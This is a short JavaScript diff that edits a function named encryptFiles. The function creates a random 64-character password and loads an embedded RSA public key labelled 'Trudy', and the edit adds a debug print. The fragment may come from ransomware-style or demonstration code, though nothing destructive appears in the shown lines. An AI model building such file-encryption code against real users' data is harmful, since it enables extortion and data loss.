@@ -20,7 +20,8 @@ var pubkeyTrudy = '-----BEGIN PUBLIC KEY-----\n'+
 //var secureRandom = require('secure-random-string');
 //var password = secureRandom(64);
 
-function encryptFiles(files){
+function encryptFiles(){
+  console.log("DUDE ITS RUNNING!!!");
   var secureRandom = require('secure-random-string');
   var password = secureRandom(64);
   var pubkey = ursa.createPublicKey(pubkeyTrudy);
